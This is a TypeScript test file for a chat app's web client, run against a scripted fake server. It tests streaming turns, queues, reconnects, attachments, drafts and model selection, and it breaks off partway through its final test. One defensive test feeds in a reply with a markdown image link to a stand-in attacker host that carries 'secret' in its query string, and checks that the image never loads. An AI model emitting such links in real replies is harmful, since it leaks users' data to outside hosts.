// The app against a scripted server (test/fixture.ts): what a phone shows as the server's AG-UI
// events arrive, and what it sends back.
import { EventType } from "@ag-ui/core";
import { afterEach, beforeEach, expect, test } from "bun:test";
import { act, cleanup, fireEvent, render, renderHook, screen, waitFor, within } from "@testing-library/react";
import { App } from "./app";
import { useAttachments } from "./chat/use-attachments";
import type { Uploader } from "./lib/attach";
import { openLink } from "./lib/connection";
import type { Inbound } from "./lib/protocol";
import { sentKey } from "./lib/draft";
import { makeSession } from "./lib/session";
import { ack, type Entry, fakeServer, IDLE, parseSent, said, snapshot, state } from "./test/fixture";
import type { Asset } from "@wire";
import { Schema } from "effect";

const LOG: Entry[] = [
  { kind: "user", text: "what is in the repo?" },
  { kind: "tool", text: 'Bash {"command":"ls"}' },
  { kind: "echo", text: "notes.md\nrepo" },
  { kind: "talk", text: "Two things: **notes** and a repo." },
];

const DEVICES = [
  { claudeVersion: "2.1.289", folders: ["~/repos"], local: true, name: "mini", status: "online", url: "http://optchat-mini:7710" },
  { claudeVersion: null, folders: ["~/repos"], local: false, name: "macbook", status: "offline", url: "http://optchat-macbook:7710" },
];

const realFetch = globalThis.fetch;
beforeEach(() => {
  globalThis.fetch = Object.assign(async (input: string | URL | Request) => {
    const path = new URL(input instanceof Request ? input.url : input, "http://127.0.0.1:7700/").pathname;
    if (path === "/api/devices") return Response.json(DEVICES);
    if (path === "/api/messages") {
      // the page before message 100 of a long log: two entries are enough
      const entries = [98, 99].map((i) => ({ date: "2026-10-05T10:00:00Z", i, kind: "user", text: `older message ${i}` }));
      return Response.json({ entries, total: 104 });
    }
    return Response.json({ error: "not in this test" }, { status: 404 });
  }, { preconnect: realFetch.preconnect });
});
afterEach(() => {
  globalThis.fetch = realFetch;
});

// `stateless`: the server's greeting holds the log only, as before its first STATE_SNAPSHOT arrives
function start(log: readonly Entry[] = LOG, from = 0, uploader?: Uploader, stateless = false) {
  let entries = [...log];
  const greeting = (): Inbound[] =>
    stateless ? [snapshot(entries, from)] : [snapshot(entries, from), { snapshot: { ...IDLE, messages: from + entries.length }, type: EventType.STATE_SNAPSHOT }];
  const server = fakeServer(greeting);
  const link = openLink("ws://127.0.0.1:7700/ws", { retryMs: 1, socket: server.socket });
  const session = makeSession(link);
  render(<App link={link} session={session} uploader={uploader} />);
  const play = (...events: Inbound[]) => {
    act(() => {
      server.play(...events);
    });
  };
  return {
    log: (more: readonly Entry[]) => {
      entries = [...entries, ...more];
    },
    play,
    server,
  };
}

const sentTexts = (sent: readonly string[]) =>
  sent.flatMap((f) => {
    const frame = parseSent(f);
    return frame.messages ? [{ device: frame.forwardedProps?.device, text: frame.messages.at(-1)?.content }] : [];
  });
// the id the newest message went out with, which the server's ack names
const lastId = (sent: readonly string[]) =>
  sent.flatMap((f) => parseSent(f).messages?.at(-1)?.id ?? []).at(-1) ?? "";

test("the snapshot shows the log: messages, a collapsed tool call, markdown with a raw-text toggle", async () => {
  start();
  await screen.findByText("what is in the repo?");
  expect(screen.getByText(/^Bash/)).toBeTruthy();
  expect(screen.getByText("Completed")).toBeTruthy();
  fireEvent.click(screen.getByText(/^Bash/));
  const output = await screen.findByText(/notes\.md/);
  expect(output.textContent).toContain("repo");
  await screen.findByText("notes"); // rendered: the asterisks are markup
  expect(screen.queryByText(/\*\*notes\*\*/)).toBeNull();
  fireEvent.click(screen.getByRole("button", { name: "Show raw text" }));
  expect(screen.getByText("Two things: **notes** and a repo.")).toBeTruthy();
});

const CODE: Entry[] = [{ kind: "talk", text: "Here:\n\n```ts\nconst x = 1;\n```" }];
const downloads = () => document.querySelectorAll('[data-streamdown="code-block-download-button"]').length;

test("in the iOS app's WebView the header offers its server screen and code blocks have no download; in a browser neither", async () => {
  start(CODE);
  await screen.findByText(/const x = 1/u);
  expect(screen.queryByRole("button", { name: "Change server" })).toBeNull();
  await waitFor(() => {
    expect(downloads()).toBe(1);
  });
  cleanup();
  const asked: string[] = [];
  globalThis.optchatShell = {
    changeServer: () => {
      asked.push("change-server");
    },
  };
  try {
    start(CODE);
    await screen.findByText(/const x = 1/u);
    // a blob: download can't load in the app (its top frame holds only the server's /)
    expect(downloads()).toBe(0);
    expect(document.querySelectorAll('[data-streamdown="code-block-copy-button"]')).toHaveLength(1);
    fireEvent.click(await screen.findByRole("button", { name: "Change server" }));
    expect(asked).toEqual(["change-server"]);
  } finally {
    globalThis.optchatShell = undefined;
  }
});

test("a turn another client started streams in, with its status line", async () => {
  const { play } = start();
  await screen.findByText("what is in the repo?");
  play(...said(4, "user", "sent from the laptop"), { runId: "4", threadId: "mini", type: EventType.RUN_STARTED }, state({ engine: "claude-code:opus", phase: "running" }));
  expect(await screen.findByText("sent from the laptop")).toBeTruthy();
  expect(screen.getByTestId("status").textContent).toContain("running on mini, Claude Opus (Claude Code)");
  play({ name: "thinking", type: EventType.CUSTOM, value: { tokens: 12 } });
  expect(screen.getByTestId("status").textContent).toContain("thinking…");
  play({ messageId: "5", role: "assistant", type: EventType.TEXT_MESSAGE_START }, { delta: "Half a ", messageId: "5", type: EventType.TEXT_MESSAGE_CONTENT });
  await screen.findByText(/Half a/);
  expect(screen.getByTestId("status").textContent).not.toContain("thinking");
  play({ delta: "reply.", messageId: "5", type: EventType.TEXT_MESSAGE_CONTENT }, { messageId: "5", type: EventType.TEXT_MESSAGE_END });
  await screen.findByText("Half a reply.");
  play({ runId: "4", threadId: "mini", type: EventType.RUN_FINISHED }, state({ engine: null, phase: "idle" }));
  await waitFor(() => {
    expect(screen.queryByTestId("status")).toBeNull();
  });
});

test("sending: the message goes out with the picked device and waits in the queue until it is logged; stop aborts", async () => {
  const { play, server } = start();
  await screen.findByText("what is in the repo?");
  const device = await screen.findByLabelText("Device");
  fireEvent.change(device, { target: { value: "macbook" } });
  const box = screen.getByLabelText("Message");
  fireEvent.change(box, { target: { value: "and now?" } });
  fireEvent.keyDown(box, { key: "Enter" });
  expect(sentTexts(server.sent)).toEqual([{ device: "macbook", text: "and now?" }]);
  const queue = await screen.findByTestId("queue");
  expect(within(queue).getByText("and now?")).toBeTruthy();

  play(state({ phase: "running" }), ack(lastId(server.sent), 4), ...said(4, "user", "and now?"));
  await waitFor(() => {
    expect(screen.queryByTestId("queue")).toBeNull();
  });
  fireEvent.click(screen.getByRole("button", { name: "Stop" }));
  expect(server.sent.at(-1)).toBe('{"type":"abort"}');
});

test("a message the log refused stays in the queue, marked not logged with the error", async () => {
  const { play, server } = start();
  await screen.findByText("what is in the repo?");
  const box = screen.getByLabelText("Message");
  fireEvent.change(box, { target: { value: "will it stick?" } });
  fireEvent.keyDown(box, { key: "Enter" });
  play(ack(lastId(server.sent), null, "no space left"));
  const queue = await screen.findByTestId("queue");
  expect(within(queue).getByText("will it stick?")).toBeTruthy();
  expect(within(queue).getByTestId("queue-error").textContent).toBe("not logged: no space left");
});

test("info and errors show as markers in the chat", async () => {
  const { play } = start();
  await screen.findByText("what is in the repo?");
  play({ name: "info", type: EventType.CUSTOM, value: "cancelled" }, { message: "usage limit: try later", type: EventType.RUN_ERROR });
  const marker = await screen.findByTestId("marker-info");
  expect(marker.textContent).toContain("cancelled");
  expect(screen.getByRole("alert").textContent).toContain("usage limit: try later");
});

test("older entries are prepended from /api/messages", async () => {
  start(LOG, 100);
  await screen.findByText("what is in the repo?");
  fireEvent.click(screen.getByRole("button", { name: "earlier messages" }));
  await screen.findByText("older message 99");
  const texts = screen.getAllByTestId("user-message").map((m) => m.textContent);
  expect(texts).toEqual(["older message 98", "older message 99", "what is in the repo?"]);
});

test("after a reconnect the chat is rebuilt from the new snapshot, without duplicates", async () => {
  const { log, play, server } = start();
  await screen.findByText("what is in the repo?");
  play(...said(4, "user", "one more"));
  await screen.findByText("one more");
  log([{ kind: "user", text: "one more" }, { kind: "talk", text: "logged while away" }]);
  act(() => {
    server.drop();
  });
  await screen.findByText("logged while away");
  expect(screen.getAllByText("one more")).toHaveLength(1);
  expect(screen.getAllByText("what is in the repo?")).toHaveLength(1);
  expect(screen.getByRole("img", { name: "connection open" })).toBeTruthy();
});

test("a tool row opened mid-turn stays open as the turn goes on and the run's snapshot lands", async () => {
  const { log, play } = start();
  await screen.findByText("what is in the repo?");
  play(...said(4, "user", "look again"), { runId: "4", threadId: "mini", type: EventType.RUN_STARTED }, state({ phase: "running" }));
  play(
    { parentMessageId: "5", toolCallId: "t5", toolCallName: "Read", type: EventType.TOOL_CALL_START },
    { delta: '{"file_path":"notes.md"}', toolCallId: "t5", type: EventType.TOOL_CALL_ARGS },
    { toolCallId: "t5", type: EventType.TOOL_CALL_END },
  );
  fireEvent.click(await screen.findByText(/^Read/));
  await screen.findByText(/"file_path":"notes\.md"/); // the input as logged, not re-serialised
  play({ content: "# notes", messageId: "6", role: "tool", toolCallId: "t5", type: EventType.TOOL_CALL_RESULT }, ...said(7, "assistant", "It has notes."));
  log([
    { kind: "user", text: "look again" },
    { kind: "tool", text: 'Read {"file_path":"notes.md"}' },
    { kind: "echo", text: "# notes" },
    { kind: "talk", text: "It has notes." },
  ]);
  play({ runId: "4", threadId: "mini", type: EventType.RUN_FINISHED }, snapshot([...LOG, { kind: "user", text: "look again" }, { kind: "tool", text: 'Read {"file_path":"notes.md"}' }, { kind: "echo", text: "# notes" }, { kind: "talk", text: "It has notes." }]), state({ phase: "idle" }));
  await screen.findByText("It has notes.");
  expect(screen.getByText(/"file_path":"notes\.md"/)).toBeTruthy(); // still open
  expect(screen.getByText("# notes")).toBeTruthy();
  const rows = [...document.querySelectorAll<HTMLElement>("[data-log-index]")].map((e) => e.dataset.logIndex);
  expect(rows).toEqual(["0", "1", "3", "4", "5", "7"]);
});

test("cancelling, then sending: the new message gets its own bubble", async () => {
  const { play } = start();
  await screen.findByText("what is in the repo?");
  play(...said(4, "user", "cancel me"), { runId: "4", threadId: "mini", type: EventType.RUN_STARTED }, state({ phase: "running" }));
  play({ messageId: "5", role: "assistant", type: EventType.TEXT_MESSAGE_START }, { delta: "Streamed ", messageId: "5", type: EventType.TEXT_MESSAGE_CONTENT });
  await screen.findByText(/Streamed/);
  play({ messageId: "5", type: EventType.TEXT_MESSAGE_END }, { message: "cancelled", type: EventType.RUN_ERROR }, snapshot([...LOG, { kind: "user", text: "cancel me" }]), state({ phase: "idle" }));
  await waitFor(() => {
    expect(screen.queryByText(/Streamed/)).toBeNull();
  });
  play(...said(5, "user", "AFTER CANCEL"));
  const bubble = await screen.findByText("AFTER CANCEL");
  expect(bubble.closest("[data-testid=user-message]")?.textContent).toBe("AFTER CANCEL");
});

test("on a touch screen Enter is a new line and the send button sends the text as typed", async () => {
  const realMatch = globalThis.matchMedia;
  globalThis.matchMedia = (query: string) => {
    const list = realMatch(query);
    Object.defineProperty(list, "matches", { value: query === "(pointer: coarse)" });
    return list;
  };
  try {
    const { server } = start();
    await screen.findByText("what is in the repo?");
    const box = screen.getByLabelText("Message");
    fireEvent.change(box, { target: { value: "  two\nlines  " } });
    fireEvent.keyDown(box, { key: "Enter" });
    expect(sentTexts(server.sent)).toEqual([]);
    fireEvent.click(screen.getByRole("button", { name: "Send" }));
    expect(sentTexts(server.sent)).toEqual([{ device: undefined, text: "  two\nlines  " }]);
    fireEvent.change(box, { target: { value: " \n " } });
    fireEvent.click(screen.getByRole("button", { name: "Send" }));
    expect(sentTexts(server.sent)).toHaveLength(1); // a blank message isn't sent
  } finally {
    globalThis.matchMedia = realMatch;
  }
});

test("a reply's markdown never loads an image", async () => {
  const { play } = start();
  await screen.findByText("what is in the repo?");
  play(...said(4, "assistant", "look: ![tracker](https://evil.example/p.png?d=secret) and ![d](data:image/png;base64,AAAA)"));
  await screen.findByText(/look:/);
  await new Promise((resolve) => {
    setTimeout(resolve, 50);
  });
  expect(document.querySelectorAll("img")).toHaveLength(0);
  expect(document.body.innerHTML).not.toContain("evil.example/p.png");
});

// ---------------------------------------------------------------------------------------------
// attachments (SPEC "Media")

// an upload that finishes when the test says: each one as asked for, its progress and its end
const fakeUploads = () => {
  const started: { body: Blob; detail: string; progress: (f: number) => void; finish: (sha: string) => void; fail: (why: string) => void }[] = [];
  const uploader: Uploader = (body, progress, detail = "standard") => {
    const { promise, reject, resolve } = Promise.withResolvers<Asset>();
    const fail = (why: string) => {
      reject(new Error(why));
    };
    const finish = (sha: string) => {
      resolve({ bytes: 2048, height: 600, kind: "image", mime: "image/jpeg", sha, width: 800 });
    };
    started.push({ body, detail, fail, finish, progress });
    return {
      abort: () => {
        fail("upload cancelled");
      },
      done: promise,
    };
  };
  return { started, uploader };
};
const SHA = (c: string) => c.repeat(64);
const png = (name: string) => new File([new Uint8Array([0x89, 0x50, 0x4E, 0x47])], name, { type: "image/png" });
const filesOf = (...files: File[]) => {
  const dt = new DataTransfer();
  for (const f of files) dt.items.add(f);
  return dt.files;
};
const Parts = Schema.Array(Schema.Struct({ type: Schema.String, text: Schema.optional(Schema.String), source: Schema.optional(Schema.Struct({ type: Schema.String, value: Schema.String })) }));

test("attach, paste and drop fill the tray; send waits for the uploads, names each by digest, and the logged message shows its thumbnails", async () => {
  const uploads = fakeUploads();
  const { play, server } = start(LOG, 0, uploads.uploader);
  await screen.findByText("what is in the repo?");
  const send = screen.getByRole("button", { name: "Send" });
  expect(send.hasAttribute("disabled")).toBe(true); // nothing to send yet

  // the picker, a paste, a drop
  const picker = screen.getByLabelText("Attach: files");
  Object.defineProperty(picker, "files", { configurable: true, value: filesOf(png("board.png")) });
  fireEvent.change(picker);
  fireEvent.paste(screen.getByLabelText("Message"), { clipboardData: { files: filesOf(png("")), types: ["Files"] } });
  fireEvent.drop(screen.getByLabelText("Message"), { dataTransfer: { files: filesOf(png("dropped.png")), types: ["Files"] } });
  await waitFor(() => {
    expect(uploads.started).toHaveLength(3);
  });
  const tray = screen.getByTestId("attachments");
  expect(within(tray).getAllByTestId("attachment").map((a) => a.dataset.state)).toEqual(["uploading", "uploading", "uploading"]);
  expect(within(tray).getByAltText("pasted image")).toBeTruthy();
  act(() => {
    uploads.started[0]?.progress(0.5);
  });
  expect(within(tray).getByLabelText("Uploading board.png")).toBeTruthy();

  // one fails: it says why and holds the message back until it is removed
  await act(async () => {
    uploads.started[0]?.finish(SHA("a"));
    uploads.started[1]?.finish(SHA("b"));
    uploads.started[2]?.fail("not an image or video this server takes");
  });
  expect(within(tray).getByRole("alert").textContent).toBe("not an image or video this server takes");
  expect(send.hasAttribute("disabled")).toBe(true);
  fireEvent.click(within(tray).getByLabelText("Remove dropped.png"));
  expect(send.hasAttribute("disabled")).toBe(false); // attachments alone are enough
  fireEvent.click(send);

  const frame = parseSent(server.sent.at(-1) ?? "");
  const parts = Schema.decodeUnknownSync(Parts)(frame.messages?.at(-1)?.content);
  expect(parts).toEqual([
    { text: "", type: "text" },
    { source: { type: "url", value: `asset:${SHA("a")}` }, type: "image" },
    { source: { type: "url", value: `asset:${SHA("b")}` }, type: "image" },
  ]);
  expect(screen.queryByTestId("attachments")).toBeNull(); // the tray is empty again
  // the queue shows them, from the uploads, before the server has said a word
  const queuedMedia = within(await screen.findByTestId("queue")).getByTestId("queue-media");
  expect(within(queuedMedia).getAllByRole("img").map((t) => t.getAttribute("src"))).toEqual(["/api/assets/aaaaaaaaaaaa/thumb", "/api/assets/bbbbbbbbbbbb/thumb"]);

  // logged: the markers, as the server writes them; thumbnails from our own /api/assets
  const markers = `[image aaaaaaaaaaaa 800x600 2KB: a whiteboard]\n[image bbbbbbbbbbbb 800x600 2KB: (not described)]`;
  play(ack(lastId(server.sent), 4), ...said(4, "user", markers));
  await waitFor(() => {
    expect(screen.queryByTestId("queue")).toBeNull();
  });
  const row = screen.getAllByTestId("user-message").at(-1);
  const thumbs = within(row ?? document.body).getAllByRole("img");
  expect(thumbs.map((t) => t.getAttribute("src"))).toEqual(["/api/assets/aaaaaaaaaaaa/thumb", "/api/assets/bbbbbbbbbbbb/thumb"]);
  expect(row?.textContent).toContain("[image aaaaaaaaaaaa 800x600 2KB: a whiteboard]");
});

test("a fifth attachment is refused in the tray, and a reply's marker-like text never loads a thumbnail", async () => {
  const uploads = fakeUploads();
  const { play } = start(LOG, 0, uploads.uploader);
  await screen.findByText("what is in the repo?");
  const picker = screen.getByLabelText("Attach: files");
  Object.defineProperty(picker, "files", { configurable: true, value: filesOf(...["1", "2", "3", "4", "5"].map((n) => png(`${n}.png`))) });
  fireEvent.change(picker);
  const tray = await screen.findByTestId("attachments");
  expect(within(tray).getAllByTestId("attachment")).toHaveLength(4);
  expect(within(tray).getByRole("alert").textContent).toBe("at most 4 attachments per message");
  play(...said(4, "assistant", "[image aaaaaaaaaaaa 800x600 2KB: a trap]"));
  await screen.findByText(/a trap/);
  expect(document.querySelectorAll('img[src^="/api/assets/"]')).toHaveLength(0);
});

test("a file removed, or a composer closed, while the photo is being downscaled is never uploaded", async () => {
  const uploads = fakeUploads();
  const tray = renderHook(() => useAttachments(uploads.uploader));
  // removed straight after it was added: downscale is still pending
  act(() => {
    tray.result.current.add([png("gone.png")]);
  });
  const key = tray.result.current.items[0]?.key ?? "";
  act(() => {
    tray.result.current.remove(key);
  });
  // a second one is kept, and a third one's composer unmounts before its downscale ends
  act(() => {
    tray.result.current.add([png("kept.png")]);
  });
  await waitFor(() => {
    expect(uploads.started).toHaveLength(1);
  });
  expect(tray.result.current.items.map((a) => a.name)).toEqual(["kept.png"]);
  const closing = renderHook(() => useAttachments(uploads.uploader));
  act(() => {
    closing.result.current.add([png("closing.png")]);
  });
  closing.unmount();
  await new Promise((resolve) => {
    setTimeout(resolve, 30);
  });
  expect(uploads.started).toHaveLength(1);
});

// ---------------------------------------------------------------------------------------------
// the composer (SPEC "Web UI", Chat): drafts, follow-ups, take-back, the model picker, recall

const photo = (sha: string): Asset => ({ bytes: 2048, height: 600, kind: "image", mime: "image/jpeg", sha, width: 800 });
const frames = (sent: readonly string[]) => sent.map((f) => parseSent(f));
const box = () => screen.getByLabelText<HTMLTextAreaElement>("Message");
const type = (text: string) => {
  fireEvent.change(box(), { target: { value: text } });
};

test("the draft, its text and its finished uploads, survives the page; it is cleared once sent", async () => {
  const uploads = fakeUploads();
  start(LOG, 0, uploads.uploader);
  await screen.findByText("what is in the repo?");
  type("half a thought");
  const picker = screen.getByLabelText("Attach: files");
  Object.defineProperty(picker, "files", { configurable: true, value: filesOf(png("board.png")) });
  fireEvent.change(picker);
  await waitFor(() => {
    expect(uploads.started).toHaveLength(1);
  });
  await act(async () => {
    uploads.started[0]?.finish(SHA("a"));
  });
  cleanup(); // the tab is evicted

  const again = start(LOG, 0, uploads.uploader);
  await screen.findByText("what is in the repo?");
  expect(box().value).toBe("half a thought");
  const tray = screen.getByTestId("attachments");
  expect(within(tray).getByRole("img").getAttribute("src")).toBe("/api/assets/aaaaaaaaaaaa/thumb");
  fireEvent.keyDown(box(), { key: "Enter" });
  const parts = Schema.decodeUnknownSync(Parts)(frames(again.server.sent).at(-1)?.messages?.at(-1)?.content);
  expect(parts).toEqual([
    { text: "half a thought", type: "text" },
    { source: { type: "url", value: `asset:${SHA("a")}` }, type: "image" },
  ]);
  expect(localStorage.getItem("optchat:draft")).toBeNull();
  // sent and not acked yet: kept, so a reload finds it in the server's queue or says it may be lost
  expect(localStorage.getItem(sentKey)).toContain("half a thought");
  again.play(ack(lastId(again.server.sent), 4));
  expect(localStorage.getItem(sentKey)).toBeNull();
});

test("with no storage at all (a private window), the composer works and keeps nothing", async () => {
  // site data blocked: even reading `localStorage` throws, as in some browsers' private modes
  const real = Object.getOwnPropertyDescriptor(globalThis, "localStorage");
  let tried = 0;
  Object.defineProperty(globalThis, "localStorage", {
    configurable: true,
    get: () => {
      tried += 1;
      throw new Error("SecurityError");
    },
  });
  try {
    const { server } = start();
    await screen.findByText("what is in the repo?");
    type("still works");
    fireEvent.keyDown(box(), { key: "Enter" });
    expect(sentTexts(server.sent)).toEqual([{ device: undefined, text: "still works" }]);
    // recall still works, from this page's memory
    fireEvent.keyDown(box(), { key: "ArrowUp" });
    expect(box().value).toBe("still works");
    expect(tried).toBeGreaterThan(0);
  } finally {
    if (real) Object.defineProperty(globalThis, "localStorage", real);
  }
});

test("a message sent before a reload that never reached the server is marked, and taken back into the composer from here", async () => {
  localStorage.setItem(sentKey, JSON.stringify({ at: Date.now(), sent: [{ from: 4, id: "lost-1", media: [photo(SHA("c"))], text: "did it go?" }] }));
  start();
  const queue = await screen.findByTestId("queue");
  // neither the log nor the server's queue has it
  await waitFor(() => {
    expect(within(queue).getByTestId("queue-error").textContent).toContain("it may not have reached the server");
  });
  fireEvent.click(within(queue).getByRole("button", { name: "Take back: did it go?" }));
  expect(box().value).toBe("did it go?");
  expect(within(screen.getByTestId("attachments")).getByRole("img").getAttribute("src")).toBe("/api/assets/cccccccccccc/thumb");
  expect(screen.queryByTestId("queue")).toBeNull();
});

test("one sent before a reload that is older than the loaded window is looked for in the log below it: found, it is done; missing, it is offered to send again; another tab's list is not this one's", async () => {
  localStorage.setItem(
    sentKey,
    JSON.stringify({
      at: Date.now(),
      sent: [
        { from: 4, id: "old-1", media: [], text: "long ago" },
        { from: 90, id: "old-2", media: [], text: "older message 99" },
      ],
    }),
  );
  localStorage.setItem("optchat:sent:another-tab", JSON.stringify({ at: Date.now(), sent: [{ from: 100, id: "theirs", media: [], text: "the other tab's" }] }));
  start(LOG, 100); // the window starts at 100: entries 4 and 90 are below it; /api/messages has 98 and 99
  await screen.findByText("what is in the repo?");
  const item = await screen.findByTestId("queue-item");
  await waitFor(() => {
    expect(within(item).getByTestId("queue-error").textContent).toContain("send it again");
  });
  expect(screen.getAllByTestId("queue-item")).toHaveLength(1);
  expect(item.textContent).toContain("long ago");
  expect(localStorage.getItem(sentKey)).not.toContain("older message 99");
  expect(localStorage.getItem("optchat:sent:another-tab")).toContain("the other tab's");
});

test("queue: a held message shows as queued with its attachments; take-back asks the server and puts it back into the composer", async () => {
  const { play, server } = start();
  await screen.findByText("what is in the repo?");
  type("typed meanwhile");
  play(state({ followUp: "queue", pending: [{ clientId: "q1", engine: "claude-code:opus", media: [photo(SHA("d"))], queued: true, text: "for later" }], phase: "running" }));
  const item = await screen.findByTestId("queue-item");
  expect(item.dataset.state).toBe("queued");
  expect(within(item).getByTestId("queue-where").textContent).toBe("queued for the next turn");
  expect(within(item).getByRole("img").getAttribute("src")).toBe("/api/assets/dddddddddddd/thumb");
  fireEvent.click(within(item).getByRole("button", { name: "Take back: for later" }));
  expect(frames(server.sent).at(-1)).toMatchObject({ clientId: "q1", type: "take-back" });
  play(state({ pending: [] }), { name: "taken-back", type: EventType.CUSTOM, value: { clientId: "q1", error: null, media: [photo(SHA("d"))], text: "for later" } });
  await waitFor(() => {
    expect(box().value).toBe("for later\ntyped meanwhile");
  });
  expect(within(screen.getByTestId("attachments")).getByRole("img").getAttribute("src")).toBe("/api/assets/dddddddddddd/thumb");
  expect(document.activeElement).toBe(box());
});

test("too late to take back: the page says so and the message stays the turn's", async () => {
  const { play } = start();
  await screen.findByText("what is in the repo?");
  play(state({ pending: [{ clientId: "q1", engine: "claude-code:opus", queued: true, text: "racing" }], phase: "running" }));
  fireEvent.click(await screen.findByRole("button", { name: "Take back: racing" }));
  play(state({ pending: [{ clientId: "q1", engine: "claude-code:opus", queued: false, text: "racing" }] }), { name: "taken-back", type: EventType.CUSTOM, value: { clientId: "q1", error: "too late: the model has it", media: [], text: null } });
  const marker = await screen.findByTestId("marker-info");
  expect(marker.textContent).toContain("couldn't take it back: too late: the model has it");
  expect(box().value).toBe("");
  expect(screen.queryByRole("button", { name: "Take back: racing" })).toBeNull();
});

test("while a turn runs: send follows the follow-up setting, the other button and Ctrl+Enter send the other way; stop stays beside send, and with nothing to send, send is stop", async () => {
  const { play, server } = start();
  await screen.findByText("what is in the repo?");
  play(state({ followUp: "queue", phase: "running" }));
  expect(screen.queryByRole("button", { name: "Send" })).toBeNull();
  expect(screen.getByRole("button", { name: "Stop" })).toBeTruthy();
  expect(box().getAttribute("placeholder")).toBe("Queue a follow-up");
  type("queued one");
  expect(screen.getByRole("button", { name: "Stop" })).toBeTruthy(); // stopping doesn't need the draft cleared
  // beside send's filled arrow, stop is outlined in the destructive color, so the two never look alike
  expect(screen.getByRole("button", { name: "Stop" }).className).toContain("text-destructive");
  expect(screen.getByRole("button", { name: "Send" }).className).not.toContain("text-destructive");
  fireEvent.click(screen.getByRole("button", { name: "Send" }));
  type("right now");
  fireEvent.click(screen.getByRole("button", { name: "Send now" }));
  type("also now");
  fireEvent.keyDown(box(), { ctrlKey: true, key: "Enter" });
  expect(frames(server.sent).map((f) => [f.messages?.at(-1)?.content, f.forwardedProps?.followUp])).toEqual([
    ["queued one", undefined],
    ["right now", "steer"],
    ["also now", "steer"],
  ]);
  // steering, the other button queues
  play(state({ followUp: "steer" }));
  type("later");
  fireEvent.click(screen.getByRole("button", { name: "Queue for the next turn" }));
  expect(frames(server.sent).at(-1)?.forwardedProps?.followUp).toBe("queue");
});

test("the follow-up setting is the server's: the composer sends the change, and shows what the state says", async () => {
  const { server } = start();
  await screen.findByText("what is in the repo?");
  fireEvent.click(screen.getByRole("button", { name: "Follow-ups: steer" }));
  fireEvent.click(await screen.findByRole("button", { name: /^Queue/ }));
  expect(frames(server.sent).at(-1)).toMatchObject({ followUp: "queue", type: "settings" });
});

test("the model picker is this page's own: switching it sends nothing; each message names the model picked when it was sent", async () => {
  const { play, server } = start();
  await screen.findByText("what is in the repo?");
  const model = screen.getByLabelText<HTMLSelectElement>("Model");
  expect([...model.options].map((o) => o.textContent)).toEqual(["Claude Opus (Claude Code)", "GPT-6.1 Sol (ChatGPT plan)"]);
  expect(within(screen.getByTestId("model-picker")).getByText("Opus")).toBeTruthy(); // none picked: the chain's first
  const before = server.sent.length;
  fireEvent.change(model, { target: { value: "openai-plan:gpt-6.1-sol" } });
  fireEvent.change(model, { target: { value: "claude-code:opus" } });
  fireEvent.change(model, { target: { value: "openai-plan:gpt-6.1-sol" } });
  expect(server.sent).toHaveLength(before); // nothing went out
  expect(within(screen.getByTestId("model-picker")).getByText("GPT-6.1 Sol")).toBeTruthy();
  expect(localStorage.getItem("optchat:model")).toBe("openai-plan:gpt-6.1-sol");
  type("hello Sol");
  fireEvent.click(screen.getByRole("button", { name: "Send" }));
  expect(frames(server.sent).at(-1)).toMatchObject({ forwardedProps: { engine: "openai-plan:gpt-6.1-sol" }, messages: [{ content: "hello Sol" }] });
  // the queue names a message's model only where it isn't the picker's
  play(
    state({
      pending: [
        { clientId: "a", engine: "claude-code:opus", queued: true, text: "for opus" },
        { clientId: "b", engine: "openai-plan:gpt-6.1-sol", queued: true, text: "for sol" },
      ],
      phase: "running",
    }),
  );
  const [opus, sol] = await screen.findAllByTestId("queue-item");
  expect(within(opus ?? document.body).getByTestId("queue-engine").textContent).toBe("Opus");
  expect(within(sol ?? document.body).queryByTestId("queue-engine")).toBeNull();
  // the server's word on the engines: Opus is down, with why
  play(
    state({
      engines: [
        { down: "Claude AI usage limit reached", label: "Claude Opus (Claude Code)", ref: "claude-code:opus" },
        { down: null, label: "GPT-6.1 Sol (ChatGPT plan)", ref: "openai-plan:gpt-6.1-sol" },
      ],
    }),
  );
  const [down] = [...screen.getByLabelText<HTMLSelectElement>("Model").options];
  expect([down?.disabled, down?.textContent]).toEqual([true, "Claude Opus (Claude Code): unavailable, Claude AI usage limit reached"]);
  // the closed picker marks its own engine when that one is down
  expect(screen.queryByTestId("picker-down")).toBeNull();
  fireEvent.change(screen.getByLabelText("Model"), { target: { value: "claude-code:opus" } });
  expect(screen.getByTestId("picker-down")).toBeTruthy();
  // while a turn runs on Sol, a message for Opus waits for a turn of its own: no "send now"
  play(state({ engine: "openai-plan:gpt-6.1-sol", phase: "running" }));
  type("for opus");
  expect(box().getAttribute("placeholder")).toBe("For the next turn (another model)");
  expect(screen.getByRole("button", { name: "Send" }).getAttribute("title")).toBe("Send (waits for the next turn: another model)");
  expect(screen.queryByRole("button", { name: /^(Send now|Queue for the next turn)$/ })).toBeNull();
});

test("one model at two efforts reads apart: the picker, a queued message and the status line show the effort as the picker's options do", async () => {
  const { play } = start();
  await screen.findByText("what is in the repo?");
  const engines = [
    { down: null, label: "Claude Opus (Claude Code)", ref: "claude-code:opus" },
    { down: null, label: "Claude Opus (Claude Code, xhigh)", ref: "claude-code:opus@xhigh" },
  ];
  play(state({ engines }));
  fireEvent.change(screen.getByLabelText("Model"), { target: { value: "claude-code:opus@xhigh" } });
  expect(within(screen.getByTestId("model-picker")).getByText("Opus · xhigh")).toBeTruthy();
  play(state({ engine: "claude-code:opus@xhigh", pending: [{ clientId: "a", engine: "claude-code:opus", queued: true, text: "for opus" }], phase: "running" }));
  const opus = await screen.findByTestId("queue-engine");
  expect(opus.textContent).toBe("Opus");
  expect(screen.getByTestId("status").textContent).toContain("running on mini, Claude Opus (Claude Code, xhigh)");
  fireEvent.change(screen.getByLabelText("Model"), { target: { value: "claude-code:opus" } });
  play(state({ pending: [{ clientId: "b", engine: "claude-code:opus@xhigh", queued: true, text: "for opus at xhigh" }] }));
  const other = await screen.findByTestId("queue-engine");
  expect([other.textContent, other.getAttribute("title")]).toEqual(["Opus · xhigh", "for Claude Opus (Claude Code, xhigh)"]);
});

test("a pick kept with the master's own effort (\"@xhigh\" once the master runs at xhigh) still finds its engine, and is kept as the chain spells it", async () => {
  localStorage.setItem("optchat:model", "claude-code:opus@xhigh");
  const { play, server } = start(LOG, 0, undefined, true);
  await screen.findByText("what is in the repo?");
  play({
    snapshot: {
      ...IDLE,
      effort: "xhigh",
      engines: [
        { down: null, label: "GPT-6.1 Sol (ChatGPT plan)", ref: "openai-plan:gpt-6.1-sol" },
        { down: null, label: "Claude Opus (Claude Code)", ref: "claude-code:opus" },
      ],
    },
    type: EventType.STATE_SNAPSHOT,
  });
